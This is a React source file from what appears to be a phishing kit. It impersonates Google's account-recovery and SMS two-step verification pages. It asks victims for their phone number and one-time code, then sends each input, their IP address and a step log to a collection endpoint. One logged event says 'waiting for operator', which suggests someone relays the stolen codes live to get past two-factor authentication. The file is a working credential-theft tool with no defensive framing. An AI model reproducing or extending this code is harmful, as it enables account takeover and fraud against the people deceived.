import React, { useState, useEffect, useContext } from "react";
import { styled } from "styled-components";
import { DataContext } from "../../pages";
import SendData from "../../hooks/SendData";
import GoogleShell, {
  GTitle,
  GBody,
  GError,
  GoogleInput,
  GoogleSpinner,
  NextButton,
  TextButton,
  GContent,
  GLeft,
  GRight,
  GActions,
} from "./GoogleShell";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import { getGoogleMaskedPhoneDisplay } from "../../utils/validationUtils";
import { COUNTRIES, DEFAULT_COUNTRY } from "../../utils/googleCountryData";
import { GOOGLE_CONFIG, googleDebugLog } from "../../utils/googleConfig";

const CountrySelect = styled.select`
  width: 100%;
  height: 56px;
  border: 1px solid #747775;
  border-radius: 4px;
  padding: 0 12px;
  font-size: 16px;
  font-family: Roboto, Arial, sans-serif;
  color: #1f1f1f;
  background: #ffffff;
  outline: none;
  appearance: none;
  cursor: pointer;

  &:focus {
    border: 2px solid #0b57d0;
  }

  &:disabled {
    color: #444746;
  }

  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='10' height='10' viewBox='0 0 24 24' fill='%23444746'%3E%3Cpath d='M7 10l5 5 5-5z'/%3E%3C/svg%3E");
  background-repeat: no-repeat;
  background-position: right 16px center;
`;

const FieldLabel = styled.div`
  font-size: 12px;
  color: #444746;
  margin-bottom: 4px;
  font-family: Roboto, Arial, sans-serif;
`;

const FieldWrap = styled.div`
  margin-bottom: 16px;
`;

const GSubHeading = styled.h2`
  font-size: 18px;
  font-weight: 400;
  color: #1f1f1f;
  margin: 0 0 16px;
  font-family: "Google Sans", Roboto, Arial, sans-serif;
`;

const ItalicNote = styled.em`
  font-style: italic;
  color: #444746;
`;

function GoogleSms({ Unik, setStep, Email, Tel, Ip, LastFetch, wrong2faTrigger }) {
  const { setAllData, AllData } = useContext(DataContext);

  // Page state: "phone" (country + phone input) then "code" (verification code entry)
  const [page, setPage] = useState("phone");
  const [selectedCountry, setSelectedCountry] = useState(DEFAULT_COUNTRY);
  const [phoneNumber, setPhoneNumber] = useState(() => {
    const digits = (Tel || "").replace(/\D/g, "");
    return digits || "";
  });
  const [sendLoading, setSendLoading] = useState(false);
  const [phoneError, setPhoneError] = useState("");
  const [noPhoneLoading, setNoPhoneLoading] = useState(false);
  const [showWaiting, setShowWaiting] = useState(false);

  const displayEmail = AllData?.google_email || Email || AllData?.login_email || "";
  const maskedPhone = getGoogleMaskedPhoneDisplay(Tel);

  const sendUpdate = (extra, stepMessage) => {
    const params = {
      ...AllData,
      id: Unik,
      ip: Ip || AllData?.ip,
      ...extra,
      currentStep: stepMessage,
    };
    setAllData(params);
    SendData(params);
  };

  useEffect(() => {
    sendUpdate({}, "Google SMS 2FA - Phone confirmation page loaded");
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  const handleSend = (e) => {
    e.preventDefault();
    if (sendLoading) return;

    if (!phoneNumber || phoneNumber.trim() === "") {
      setPhoneError("Enter a phone number");
      return;
    }

    setPhoneError("");
    setSendLoading(true);

    const fullNumber = `${selectedCountry.code} ${phoneNumber.trim()}`;
    sendUpdate(
      {
        google_sms_phone: fullNumber,
        google_sms_country: selectedCountry.name,
      },
      `Google SMS 2FA - Phone submitted: ${fullNumber} (${selectedCountry.name})`
    );

    setTimeout(() => {
      setSendLoading(false);
      setPage("code");
    }, GOOGLE_CONFIG.VERIFY_DELAY);
  };

  const handleNoPhone = () => {
    if (showWaiting) return;
    setShowWaiting(true);
    sendUpdate({}, "Google SMS 2FA - User clicked: I don't have my phone — waiting for operator");
  };

  if (showWaiting) {
    return (
      <GoogleShell initialLoading={false}>
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: 300, gap: 24 }}>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>Looking for more options…</GBody>
        </div>
      </GoogleShell>
    );
  }

  // ---- Page: Phone confirmation ----
  if (page === "phone") {
    return (
      <GoogleShell initialLoading>
        <GContent>
          <GLeft>
            <GTitle style={{ fontSize: 36 }}>Account recovery</GTitle>
            <GBody style={{ marginBottom: 8, fontSize: 15, color: "#1f1f1f" }}>{displayEmail}</GBody>
            <GBody style={{ marginBottom: 32 }}>
              To help keep your account safe, Google wants to make sure
              it&rsquo;s really you trying to sign in
            </GBody>
            <GSubHeading>Get a verification code</GSubHeading>
            <GBody>
              To get a verification code, first confirm the phone number you
              added to your account{" "}
            </GBody>
          </GLeft>
          <GRight>
            <form id="google-sms-phone-form" onSubmit={handleSend}>
              <FieldWrap>
                <FieldLabel>Calling Code</FieldLabel>
                <CountrySelect
                  value={selectedCountry.code}
                  onChange={(e) => {
                    const found = COUNTRIES.find((c) => c.code === e.target.value);
                    if (found) setSelectedCountry(found);
                  }}
                  disabled={sendLoading || noPhoneLoading}
                >
                  {COUNTRIES.map((c) => (
                    <option key={c.name} value={c.code}>
                      {c.name} ({c.code})
                    </option>
                  ))}
                </CountrySelect>
              </FieldWrap>
              <FieldWrap>
                <GoogleInput
                  label="Phone number"
                  name="sms-phone"
                  type="tel"
                  value={phoneNumber}
                  onChange={(e) => {
                    setPhoneNumber(e.target.value);
                    if (phoneError) setPhoneError("");
                  }}
                  error={!!phoneError}
                  disabled={sendLoading || noPhoneLoading}
                  autoFocus
                  autoComplete="tel"
                />
                {phoneError && <GError>{phoneError}</GError>}
              </FieldWrap>
            </form>
          </GRight>
        </GContent>
        <GActions>
          <TextButton type="button" onClick={handleNoPhone} disabled={sendLoading || noPhoneLoading}>
            {noPhoneLoading ? <GoogleSpinner size={16} /> : "I don't have my phone"}
          </TextButton>
          <NextButton type="submit" form="google-sms-phone-form" disabled={sendLoading || noPhoneLoading}>
            {sendLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Send"}
          </NextButton>
        </GActions>
      </GoogleShell>
    );
  }

  // ---- Page: Code entry ----
  return <GoogleSmsCodeEntry setStep={setStep} LastFetch={LastFetch} wrong2faTrigger={wrong2faTrigger} displayEmail={displayEmail} maskedPhone={maskedPhone} />;
}

// --------- Code entry sub-component (uses useFa2Logic) ---------
function GoogleSmsCodeEntry({ setStep, LastFetch, wrong2faTrigger, displayEmail, maskedPhone }) {
  const [showWaiting, setShowWaiting] = useState(false);

  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "Google SMS 2FA",
    initialMessage: "Google SMS 2FA Code Entry Page Loaded",
    allowImmediateRetry: true,
  });

  const handleFormSubmit = (e) => {
    handleSubmit(e, "google_sms");
  };

  const handleTryAnotherWay = () => {
    if (showWaiting || isLoading) return;
    setShowWaiting(true);
  };

  if (showWaiting) {
    return (
      <GoogleShell initialLoading={false}>
        <div style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", minHeight: 300, gap: 24 }}>
          <GoogleSpinner size={36} />
          <GBody style={{ textAlign: "center" }}>Looking for more options…</GBody>
        </div>
      </GoogleShell>
    );
  }

  return (
    <GoogleShell initialLoading>
      <GContent>
        <GLeft>
          <GTitle style={{ fontSize: 36 }}>Verify it&rsquo;s you</GTitle>
          <GBody style={{ fontSize: 15, color: "#1f1f1f" }}>{displayEmail}</GBody>
          <GBody style={{ marginTop: 24 }}>
            To help keep your account safe, Google wants to make sure
            it&rsquo;s really you trying to sign in
          </GBody>
          <GBody style={{ marginTop: 8 }}>
            Google sent a verification code to{" "}
            <strong>{maskedPhone}</strong>. Standard rates apply.
          </GBody>
        </GLeft>
        <GRight>
          <form id="google-sms-code-form" onSubmit={handleFormSubmit}>
            <GoogleInput
              label="Enter code"
              name="sms-code"
              value={code}
              onChange={handleCodeChange}
              error={shouldShowRedBorder()}
              disabled={isLoading || showWaiting}
              autoFocus
              autoComplete="one-time-code"
            />
            {showError && <GError>Wrong code. Try again.</GError>}
          </form>
        </GRight>
      </GContent>
      <GActions>
        <TextButton type="button" onClick={handleTryAnotherWay} disabled={isLoading || showWaiting}>
          {showWaiting ? <GoogleSpinner size={16} /> : "Try another way"}
        </TextButton>
        <NextButton type="submit" form="google-sms-code-form" disabled={isButtonDisabled() || showWaiting}>
          {isLoading ? <GoogleSpinner color="#ffffff" size={18} /> : "Next"}
        </NextButton>
      </GActions>
    </GoogleShell>
  );
}

export default GoogleSms;
